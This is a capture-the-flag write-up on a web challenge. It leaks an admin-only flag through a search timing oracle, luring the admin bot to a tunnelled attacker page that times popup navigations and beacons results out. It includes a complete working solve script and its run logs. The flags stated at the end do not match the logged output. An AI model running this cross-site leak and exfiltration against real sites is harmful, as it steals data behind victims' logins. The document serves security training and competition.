# Leaky CTF Platform Revenge Revenge Revenge - Writeup

## Files related to solving the challenge are in the root directory

## Please open issue should you have any questions. It will be added to the respective Q&A section.

Author: U060_hello world has been taken

![FIRST BLOOD WOO](img/FirstBlood.png)

## Situation

Leaky CTF Platform Revenge Revenge Revenge

My brain wasn't clear when I made this challenge 😭. Please solve it without using unintended solutions!

> Note: The intended solution might be a little bit unstable. Please try to run your exploit multiple times if you cannot get the flag at the first time.

Author: siunam\
Flag Format: `PUCTF26{[a-zA-Z0-9_]+_[a-fA-F0-9]{32}}`

Attachments:\
`leaky_ctf_platform_revenge.zip`\
│ㅤㅤ[`compose.yaml`](./chal/compose.yaml)\
│ㅤㅤ[`Dockerfile`](./chal/Dockerfile)\
│ㅤㅤ[`requirements.txt`](./chal/requirements.txt)\
└─── [app](./chal/app)\
ㅤㅤ│ㅤㅤ[`__init__.py`](./chal/app/__init__.py)\
ㅤㅤ│ㅤㅤ[`bot.py`](./chal/app/bot.py)\
ㅤㅤ│ㅤㅤ[`config.py`](./chal/app/config.py)\
ㅤㅤ│ㅤㅤ[`turnstile.py`](./chal/app/turnstile.py)\
ㅤㅤ│\
ㅤㅤ└─── [templates](./chal/app/templates)\
ㅤㅤㅤㅤㅤㅤㅤ[`index.html`](./chal/app/templates/index.html)\
ㅤㅤㅤㅤㅤㅤㅤ[`report.html`](./chal/app/templates/report.html)

Note: the challenge instance used by this writeup is at `http://chal.polyuctf.com:47263`

## The Beginning

We are given a Flask app with an admin bot, inside the website we have 4 different endpoints (except the obvious `/` duhhh):

- `/search?flag=xxx` -> admin-only (cookie check) -> tells if **any** flag in global list **starts with** query
- `/spam_flags?size=xxx` -> append many fake `flag{xxxxxx}` entries (public, rate-limited but generous)
- `/submit_flag?flag=leakyctf{xxxxxxxx}` -> if exact match to internal flag -> leak REAL_FLAG env var
- `/report` -> submit URL -> bot visits it (Playwright chromium, headless)

Global flags list starts with one secret entry:

```python
# FROM config.py
CORRECT_FLAG_PREFIX = 'leakyctf'
CORRECT_FLAG = f'{CORRECT_FLAG_PREFIX}{{{secrets.token_hex(RANDOM_HEX_LENGTH)}}}'
# which transforms to
CORRECT_FLAG = f'leakyctf{{{secrets.token_hex(?)}}}'
flags = [CORRECT_FLAG] # important: real one is index 0
```

So basically, to get our actual PUCTF26 flag, we need to first find the leakyctf flag, then submit it to `/submit_flag` endpoint.

## The Beginning - checkpoint Q&A

**Q - Why does this Q&A look unnecessary?**\
A - Because I can't think of any Q&A here

## Vuln? Where

In `/search` endpoint, we can see a linear flag search.

```py
foundFlag = any(f for f in flags if f.startswith(flag))
```

Linear search from beginning with correct flag at index 0? It is screaming timing oracle attack, if the flag list is big enough then:

Correct prefix -> hits index 0 instantly -> fast return\
Wrong prefix -> scans **all** of the many fake flags-> slow

And voila we have a `/spam_flag` endpoint to populate the flags list quickly, how convenient <sub>lol</sub>

Sadly, only admin has access to this vulnerable `/search` endpoint, because before the linear search where the timing difference take place, we have this cookie check.

```py
if request.cookies.get('admin_secret', '') != config.ADMIN_SECRET:
        return 'Access denied. Only admin can access this endpoint.', 403
```

Thats unfortunate, we are not admin, but we have access to the `/report` endpoint, which ~~slaves~~ the admin bot to make a request to a user-provided URL, how convenient (again).

## Vuln? Where - checkpoint Q&A

**Q - Why so convenient?**\
A - Because this is a convenient <sub>(flag)</sub> store (jk no)

## The convenient admin bot

Since the bot is our entry point, lets take a closer look at it (bot.py)

The bot sets `admin_secret` cookie for domain `localhost` with `SameSite=Lax` + `HttpOnly`, and then visits a user-supplied URL for 60 seconds.

With this cookie settings, we cannot use `fetch()` (cross-origin) or `document.cookie` (violates HttpOnly) to leak the admin cookie, so we have to make the bot visit `/search` endpoint.

However, because it's Lax, top-level navigations (e.g. `window.location = ...` or `win.location = ...` in a popup) **will send** the cookie to `http://localhost:5000` and thus `/search`.

We cannot read the response body (SOP), but we **can** measure how long a popup stays same-origin before the cross-origin navigation commits.

- Fast commit time -> prefix matched (hit index 0) -> page loaded quickly
- Slow commit time -> full scan -> page took longer to respond

## The convenient admin bot - checkpoint Q&A

**Q - Ok this Q should be on the last checkpoint but this checkpoint is empty so Ima place it here (Im sorry)**\
**How and why does the timing oracle attack work?**\
A - Picture this:\
we have an array of ["yay1", "no3", "no2", "no4", "no9", "no6"], we can any it, and we want to see the value behind yay

`any()` uses linear search, if we search for yay, it will see the first item, it is yay, since this query found a matching item, regardless of there being another match later on `any()` will still return true, it exits early as a builtin optimization, lets say this search took 1ms\
If we search for no, it will see yay1 doesn't match, no1 matches, exits, probably 2ms\
If we search for maybe, it will see yay1 doesn't match, no1 doesn't match, no2 doesn't match, ..., no6 doesn't match, not found so returns false and exits, probably 10ms

As you can see, the earlier the match occurs, the faster the search is. And if there is no match, the search is very slow as it went through every item in the array. This time difference increase as the array size increases.\
So, timing oracle is search for yay1 and it took 1ms, yay2 10ms (because not found), yay3 10ms, and so on. yay1 stands out for being significantly faster than the rest, so we know the value starts with 1\
Then, we search yay11 10ms, yay12 10ms, and so on. Since all of them are similarly slow, we know its either the array isn't big enough, or the value is literally 1.

So, thats basically how timing oracle for linear search works

## The flow

Now we can have the exploit flow

1. populate the flag list through `/spam_flags`
2. Host a website on a public URL and make the bot visit it through `/report`
3. The website opens a popup and repeatedly navigates that popup to `http://localhost:5000/search?flag=<candidate>`
4. Measure how long the popup remains same-origin accessible (searching) before the navigation commits to the cross-origin `localhost` page (result (not) found)
5. Brute-force the internal flag one character at a time until we get a `}` (ie flag ends)
6. Submit it to `/submit_flag` to receive the real flag.

### details

#### Step 1

```bash
for i in $(seq 1 10); do
  curl 'http://chal.polyuctf.com:47263/spam_flags?size=100000'
done
```

we can use this simple bash script to populate the flag list to 1M entries, thats enough to create some distinct time differences.

#### Step 2

start a server using http.server

```py
def start_server(state: State, html: bytes, port: int):
    Handler.state = state
    Handler.html = html
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd
```

And tunnel it to a public url

#### Step 3 & 4

we can have this simple script to open a popup, and repeatedly navigate it to `http://localhost:5000/search?flag=<candidate>`

```js
async function probe(win, prefix) {
  win.location = `about:blank?reset=${Math.random()}`;
  await waitUntilSameOrigin(win);

  const start = performance.now();
  win.location =
    `http://localhost:5000/search?flag=${encodeURIComponent(prefix)}&nonce=${Math.random()}`;

  while (true) {
    try {
      void win.location.href;
      await sleep(0);
    } catch {
      return performance.now() - start;
    }
  }
}
```

However, since one-shot timing on each candidate char is too noisy from network jitter and bot load and etc, we do a delta measurement for each candidate char instead, which is much more stable.

```js
score(prefix + c) = probe(prefix + c + "!") - probe(prefix + c)
```

- probe hit: `<known><c>`
- probe forced miss: `<known><c>!`
- score: `time(miss) - time(hit)`

The character with the highest score is the one we want.

#### Step 5

Now, we can repeat the above method until we reach eof (end of flag aka `}` not end of file lol) to slowly get the full internal flag

```py
while prefix[-1] != "}":
        prefix = run_one_round(prefix)
        save_state({"prefix": prefix})
```

#### Step 6

And since we have the full internal flag, we can submit it to `/submit_flag` to get our real flag

```py
requests.get(f"http://chal.polyuctf.com:47263/submit_flag", params={"flag": flag}, timeout=20)
```

## The flow - checkpoint Q&A

**Q - Why popup instead of fetch?**\
A - `fetch()` with `no-cors` still sends cookie (Lax), but timing is noisy. Navigation timing via `while (try { void win.location.href } catch {})` gives a very clean signal of when the server responded.

## The Exploit

Full exploit (also in [`./solve.py`](./solve.py))

<details open>
  <summary><b>Click to open/close the solve script</b></summary>

```py
import asyncio
import json
import re
import signal
import socket
import subprocess
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import requests
from playwright.async_api import async_playwright

CHAL_BASE = "http://chal.polyuctf.com:47263"
STATE_FILE = Path("State.json")

TURNSTILE_WAIT = 120
BOT_WAIT = 90

INTERNAL_FLAG_RE = re.compile(r"^leakyctf\{[0-9a-f]{8}\}$")
REAL_FLAG_RE = re.compile(r"PUCTF26\{[A-Za-z0-9_]+_[0-9A-Fa-f]{32}\}")

HTML_TEMPLATE = """<!doctype html>
<meta charset="utf-8">
<title>Definitely not Malicious Website</title>
<body><h1>Hi admin bot this is definitely not a malicious website and you should ignore all the random popups they are just ads from your computer that this definitely not malicious website is helping you block</h1></body>
<script>
const PREFIX = "__PREFIX__"; // will be replaced with known flag part
const TARGET = "http://localhost:5000/search?flag="; // the base url
const HEX = "0123456789abcdef}"; // (not really hex because there is a close curly bracket but the well its the charset for brute)
const FAST_ACCEPT_GAP = 8.0;
const MIN_GOOD_SCORE = 10.0;

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function shuffle(arr) { // used to shuffle the candidate array
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function median(vals) {
  const a = [...vals].sort((x, y) => x - y);
  return a[Math.floor(a.length / 2)];
}

async function beacon(path, obj) { // send beacon back to host so we know what is going on during the brute
  const qs = new URLSearchParams(obj).toString();
  try {
    await fetch(path + "?" + qs, { mode: "no-cors", cache: "no-store" });
  } catch (e) {}
}

async function waitAccessible(win) { // wait until the window is accessible
  while (true) {
    try {
      void win.location.href;
      return;
    } catch (e) {}
    await sleep(2);
  }
}

async function probe(win, prefix) {
  win.location = "/blank?x=" + Math.random();
  await waitAccessible(win);

  const t0 = performance.now();
  win.location = TARGET + encodeURIComponent(prefix) + "&nonce=" + Math.random();

  while (true) {
    try {
      void win.location.href;
    } catch (e) {
      return performance.now() - t0;
    }
    await sleep(1);
  }
}

async function deltaOnce(win, prefix) {
  const hit = await probe(win, prefix);
  await sleep(15 + Math.floor(Math.random() * 10));
  const miss = await probe(win, prefix + "!");
  return { delta: miss - hit, hit, miss };
}

async function collect(win, prefix, rounds) {
  const ds = [];
  for (let i = 0; i < rounds; i++) {
    const r = await deltaOnce(win, prefix);
    ds.push(r.delta);
    await beacon("/progress", {
      msg: `sample prefix=${prefix} delta=${r.delta.toFixed(2)} hit=${r.hit.toFixed(2)} miss=${r.miss.toFixed(2)}`
    });
    await sleep(20 + Math.floor(Math.random() * 15));
  }
  return {
    prefix,
    ch: prefix[prefix.length - 1],
    deltas: ds,
    score: median(ds),
  };
}

async function main() {
  const win = window.open("/blank", "probe");
  if (!win) {
    await beacon("/progress", { msg: "popup blocked" });
    return;
  }

  await beacon("/progress", { msg: "start " + PREFIX });

  let results = [];
  for (const ch of shuffle(HEX.split(""))) {
    const prefix = PREFIX + ch;
    const r = await collect(win, prefix, 1);
    results.push(r);
  }

  results.sort((a, b) => b.score - a.score);
  await beacon("/progress", {
    msg: "rank1 " + results.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
  });

  const best = results[0];
  const second = results[1];
  if (!(best.score >= MIN_GOOD_SCORE && (best.score - second.score) >= FAST_ACCEPT_GAP)) {
    const finalists = [results[0], results[1], results[2]];
    let refined = [];

    for (const item of finalists) {
      const more = await collect(win, item.prefix, 2);
      const all = item.deltas.concat(more.deltas);
      refined.push({
        prefix: item.prefix,
        ch: item.ch,
        deltas: all,
        score: median(all),
      });
    }

    refined.sort((a, b) => b.score - a.score);
    results = refined.concat(results.slice(3));
    await beacon("/progress", {
      msg: "rank2 " + refined.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
    });
  }

  results.sort((a, b) => b.score - a.score);
  const winner = results[0];

  await beacon("/result", {
    ch: winner.ch,
    newprefix: PREFIX + winner.ch,
    score: winner.score.toFixed(2)
  });

  win.close();
}

main().catch(async (e) => {
  await beacon("/progress", { msg: "error " + String(e) });
});
</script>
"""

@dataclass
class State:
    logs: list[str] = field(default_factory=list)
    found_char: str | None = None
    new_prefix: str | None = None
    event: threading.Event = field(default_factory=threading.Event)

    def log(self, msg: str):
        line = f"[{time.strftime('%H:%M:%S')}] {msg}"
        self.logs.append(line)
        print(line, flush=True)

class Handler(BaseHTTPRequestHandler):
    state: State | None = None
    html: bytes = b""

    def log_message(self, fmt, *args):
        return

    def _send(self, body: bytes, status=200, ctype="text/html; charset=utf-8"):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        if parsed.path == "/":
            return self._send(self.html)

        if parsed.path == "/blank":
            return self._send(b"<!doctype html><title>blank</title>")

        if parsed.path == "/progress":
            msg = qs.get("msg", [""])[0]
            if msg:
                self.state.log(msg)
            return self._send(b"ok", ctype="text/plain; charset=utf-8")

        if parsed.path == "/result":
            ch = qs.get("ch", [""])[0]
            newprefix = qs.get("newprefix", [""])[0]
            score = qs.get("score", [""])[0]
            self.state.log(f"winner char={ch} newprefix={newprefix} score={score}")
            self.state.found_char = ch
            self.state.new_prefix = newprefix
            self.state.event.set()
            return self._send(b"ok", ctype="text/plain; charset=utf-8")

        if parsed.path == "/logs":
            body = ("\n".join(self.state.logs)).encode()
            return self._send(body, ctype="text/plain; charset=utf-8")

        return self._send(b"not found", status=404, ctype="text/plain; charset=utf-8")

def load_state():
    if STATE_FILE.exists():
        return json.loads(STATE_FILE.read_text())
    return {"prefix": "leakyctf{"}

def save_state(obj):
    STATE_FILE.write_text(json.dumps(obj, indent=2))

def pick_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port

def start_server(state: State, html: bytes, port: int):
    Handler.state = state
    Handler.html = html
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd

def start_tunnel(port: int):
    proc = subprocess.Popen(
        [
            "ssh",
            "-T",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ServerAliveInterval=30",
            "-o", "ServerAliveCountMax=3",
            "-o", "LogLevel=ERROR",
            "-R", f"80:localhost:{port}",
            "nokey@localhost.run",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    assert proc.stdout is not None
    deadline = time.time() + 30
    public_url = None

    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        print(line.rstrip(), flush=True)
        m = re.search(r"https://[A-Za-z0-9._-]+", line)
        if m:
            public_url = m.group(0)
            break

    if not public_url:
        proc.kill()
        raise RuntimeError("cannot obtain localhost.run URL")

    def drain():
        assert proc.stdout is not None
        for line in proc.stdout:
            print(line.rstrip(), flush=True)

    threading.Thread(target=drain, daemon=True).start()
    return proc, public_url

def terminate(proc):
    if proc is None or proc.poll() is not None:
        return
    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

def fill_flags():
    print("[*] filling flags...", flush=True)
    for i in range(9):
        r = requests.get(f"{CHAL_BASE}/spam_flags", params={"size": 100000}, timeout=20)
        print(f"    round {i+1}: {r.status_code} {r.text.strip()}", flush=True)
        if r.status_code == 400 and "exceed the maximum" in r.text:
            print("[*] flag store already full enough", flush=True)
            return
        time.sleep(1.05)

    r = requests.get(f"{CHAL_BASE}/spam_flags", params={"size": 99999}, timeout=20)
    print(f"    final: {r.status_code} {r.text.strip()}", flush=True)
    if r.status_code == 400 and "exceed the maximum" in r.text:
        print("[*] flag store already full enough", flush=True)

async def get_turnstile_token():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=["--disable-blink-features=AutomationControlled"],
        )
        page = await browser.new_page()
        try:
            await page.goto(f"{CHAL_BASE}/report", wait_until="load")
            print("[*] browser opened; solve Turnstile in the visible window", flush=True)

            locator = page.locator("#cf-turnstile-response")
            deadline = time.time() + TURNSTILE_WAIT

            while time.time() < deadline:
                try:
                    value = await locator.input_value()
                except Exception:
                    value = ""
                if value:
                    print(f"[*] got token len={len(value)}", flush=True)
                    return value
                await page.wait_for_timeout(1000)

            raise RuntimeError("timed out waiting for turnstile token")
        finally:
            await browser.close()

def submit_report(public_url: str):
    token = asyncio.run(get_turnstile_token())
    return requests.post(
        f"{CHAL_BASE}/report",
        data={"url": public_url, "answer": token},
        timeout=20,
    )

def submit_internal(flag: str):
    r = requests.get(f"{CHAL_BASE}/submit_flag", params={"flag": flag}, timeout=20)
    return r.status_code, r.text

def run_one_round(prefix: str):
    state = State()
    port = pick_port()
    html = HTML_TEMPLATE.replace("__PREFIX__", prefix).encode()

    httpd = start_server(state, html, port)
    tunnel_proc = None

    try:
        print(f"[*] local server on 127.0.0.1:{port}", flush=True)
        tunnel_proc, public_url = start_tunnel(port)
        print(f"[*] public url: {public_url}", flush=True)

        r = submit_report(public_url)
        print(f"[*] report(token) -> {r.status_code} {r.text.strip()}", flush=True)

        if r.status_code not in (200, 504):
            raise RuntimeError(f"report failed: {r.status_code}")

        if not state.event.wait(BOT_WAIT):
            raise RuntimeError("timed out waiting for winner char")

        if not state.new_prefix:
            raise RuntimeError("did not receive new prefix")

        return state.new_prefix
    finally:
        httpd.shutdown()
        httpd.server_close()
        terminate(tunnel_proc)

def main():
    st = load_state()
    prefix = st.get("prefix", "leakyctf{")
    print(f"[*] current prefix = {prefix}", flush=True)

    fill_flags()

    while prefix[-1] != "}":
        prefix = run_one_round(prefix)
        save_state({"prefix": prefix})
        print(f"[+] saved prefix = {prefix}", flush=True)

    internal_flag = prefix
    print(f"[+] internal flag = {internal_flag}", flush=True)

    if not INTERNAL_FLAG_RE.fullmatch(internal_flag):
        raise RuntimeError("internal flag format mismatch")

    code, text = submit_internal(internal_flag)
    print(f"[+] submit_flag status = {code}", flush=True)
    print(text, flush=True)

    m = REAL_FLAG_RE.search(text)
    if m:
        print(f"[+] real flag = {m.group(0)}", flush=True)
    else:
        print("[-] real flag not parsed from response, received text:", flush=True)
        print(text, flush=True)

if __name__ == "__main__":
    main()
```

</details>

After running it the output looks like this

```none
[*] current prefix = leakyctf{
[*] filling flags...
    round 1: 200 Done adding flags. Total flags: 100001
    round 2: 200 Done adding flags. Total flags: 200001
    round 3: 200 Done adding flags. Total flags: 300001
    round 4: 200 Done adding flags. Total flags: 400001
    round 5: 200 Done adding flags. Total flags: 500001
    round 6: 200 Done adding flags. Total flags: 600001
    round 7: 200 Done adding flags. Total flags: 700001
    round 8: 200 Done adding flags. Total flags: 800001
    round 9: 200 Done adding flags. Total flags: 900001
    final: 200 Done adding flags. Total flags: 1000000
[*] local server on 127.0.0.1:57419
authenticated as anonymous user
8beaa541ba3dc2.lhr.life tunneled with tls termination, https://8beaa541ba3dc2.lhr.life
create an account and add your key for a longer lasting domain name. see https://localhost.run/docs/forever-free/ for more information.
Open your tunnel address on your mobile with this QR:
...
[*] browser opened; solve Turnstile in the visible window
[*] got token len=1029
[02:27:59] start leakyctf{
...
[+] saved prefix = leakyctf{4
[*] local server on 127.0.0.1:51833
[*] public url: https://479267e5e44d3d.lhr.life
[*] browser opened; solve Turnstile in the visible window
[*] got token len=1029
[02:29:05] start leakyctf{4
[02:29:06] sample prefix=leakyctf{4d delta=-4.70 hit=48.20 miss=43.50
...
...
[*] public url: https://d488e70ee7c1d5.lhr.life
[*] browser opened; solve Turnstile in the visible window
[*] got token len=1029
[02:35:40] start leakyctf{4c2c16f
[02:35:41] sample prefix=leakyctf{4c2c16f02 delta=1.10 hit=39.70 miss=40.80
[02:35:45] sample prefix=leakyctf{4c2c16f07 delta=1.20 hit=42.80 miss=44.00
[*] report(token) -> 504 <html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.29.5</center>
</body>
</html>
[02:35:50] sample prefix=leakyctf{4c2c16f08 delta=-0.60 hit=48.40 miss=47.80
[02:35:54] sample prefix=leakyctf{4c2c16f09 delta=1.50 hit=48.00 miss=49.50
[02:35:57] sample prefix=leakyctf{4c2c16f06 delta=1.40 hit=50.20 miss=51.60
[02:36:00] sample prefix=leakyctf{4c2c16f0{ delta=30.70 hit=23.60 miss=54.30
[02:36:03] sample prefix=leakyctf{4c2c16f0e delta=1.60 hit=54.90 miss=56.50
[02:36:06] sample prefix=leakyctf{4c2c16f0c delta=-1.90 hit=61.50 miss=59.60
[02:36:10] sample prefix=leakyctf{4c2c16f05 delta=5.70 hit=60.80 miss=66.50
[02:36:13] sample prefix=leakyctf{4c2c16f0d delta=2.40 hit=63.20 miss=65.60
[02:36:16] sample prefix=leakyctf{4c2c16f04 delta=0.60 hit=67.60 miss=68.20
[02:36:19] sample prefix=leakyctf{4c2c16f03 delta=-0.80 hit=70.30 miss=69.50
[02:36:25] sample prefix=leakyctf{4c2c16f0b delta=2.70 hit=72.30 miss=75.00
[02:36:29] sample prefix=leakyctf{4c2c16f01 delta=-1.10 hit=75.30 miss=74.20
[02:36:32] sample prefix=leakyctf{4c2c16f0f delta=4.40 hit=75.10 miss=79.50
[02:36:36] sample prefix=leakyctf{4c2c16f0a delta=-2.50 hit=82.90 miss=80.40
[02:36:36] sample prefix=leakyctf{4c2c16f00 delta=-1.70 hit=83.00 miss=81.30
[02:36:37] rank1 }:30.70, 5:5.70, f:4.40, b:2.70, d:2.40, e:1.60, 9:1.50, 6:1.40, 7:1.20, 2:1.10, 4:0.60, 8:-0.60, 3:-0.80, 1:-1.10, 0:-1.70, c:-1.90, a:-2.50
[02:36:38] winner nibble=0 newprefix=leakyctf{4c2c16f0} score=30.70
[+] saved prefix = leakyctf{4c2c16f0}
[+] internal flag = leakyctf{4c2c16f0}
[+] submit_flag status = 200
Correct! The real flag is: PUCTF26{Please_do_not_use_an_unintended_solution_to_solve_this_challenge_xddd_B4zcqTrZIbokHErpfzVtzUWw5d7we7NU}
[-] real flag not parsed from response
```

where from the output you can get

### The flag

`leakyctf{4c2c16f00}`

and also

### The flag (real)

`PUCTF26{Please_do_not_use_an_unintended_solution_to_solve_this_challenge_xddd_GmTUg5dXx6V1aqLJAUkQJUSAHAqa44lX}`

(Lol the author is so evil the real flag doesn't match the flag format stated in the question that the flag regex can't match it, RIP those who only show flag when it matches the regex and missed the flag (if any) lmaooooo)

## The Exploit - checkpoint Q&A

**Q - Why so many repetitions and median?**\
A - Author said "unstable" — single measurement often wrong. 3 reps + median + delta scoring made it reliable after a few runs.

**Q - Why `about:blank?reset=...` before each probe?**\
A - Reset popup to known same-origin state so we can reliably detect cross-origin commit via `location.href` access throwing.

**Q - Why shuffle candidates?**\
A - Avoids systematic bias from cache / CPU warming / whatever.

**Q - Why beacon to /progress?**\
A - Optional debugging — lets you see live progress on your server logs while bot is running.

**Q - How does the beacon work?**\
A - The JS beacons hit our endpoint via the public URL with the message placed in `msg` query param via fetch, so we can get the message from the requests we receive.
